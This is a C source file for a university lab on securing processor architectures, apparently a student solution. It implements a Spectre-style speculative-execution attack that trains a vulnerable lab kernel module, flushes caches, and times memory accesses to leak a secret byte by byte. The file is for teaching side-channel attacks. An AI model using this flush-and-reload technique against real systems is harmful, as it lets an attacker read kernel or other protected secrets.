/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {

    char leaked_str[LAB2_SECRET_MAX_LEN];
    char leaked_byte_array[10];
    size_t current_offset = 0;
    int access_time;
    int found[10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    volatile int temp;


    uint64_t *eviction_buffer = (uint64_t *)malloc(8192*8*sizeof(uint64_t));
    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

    for (int rep = 0; rep < 2; ) { 
        // [Part 2]- Fill this in!
        // leaked_byte = ??
       for (int i =0; i < 2; i++) {	
	       call_kernel_part3(kernel_fd, shared_memory, 0);
       }

      

       for (int lines = 0; lines < 8192; lines++) {
           clflush(eviction_buffer + 8*lines);
       }

       for (int pages = 0; pages < 128; pages++) {
           clflush(shared_memory + 4096*pages);
       }

       for (int lines = 0; lines < 8192; lines++) {
           temp = eviction_buffer[lines*8];
       }
       
       call_kernel_part3(kernel_fd, shared_memory, current_offset);

       for (int cache_line = 0; cache_line < 128; cache_line++) {
	       access_time = time_access(shared_memory + 4096*cache_line);
               if (access_time < 150) {
		       
		leaked_byte_array[rep] = (char) cache_line;
		rep++;
		//leaked_byte = (char) cache_line;
	
//	       printf("The time access for block %d is %d with leaked byte is %c\n",cache_line, access_time, leaked_byte); 
	       
	       }
          }

   }

     for (int i =0; i <2; i++) {
	  for (int j = 0; j < 2; j++) {
             if (i != j) 
              if (leaked_byte_array[i] == leaked_byte_array[j]) {
	          found[i]++;
	      }
        }
     }
     for (int i =0; i < 2; i++) {
      if (found[i] >= 1) {
      leaked_byte = leaked_byte_array[i];
      printf("The leaked byte is %c\n", leaked_byte);
      break; 
      }
     }
     



        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;

}

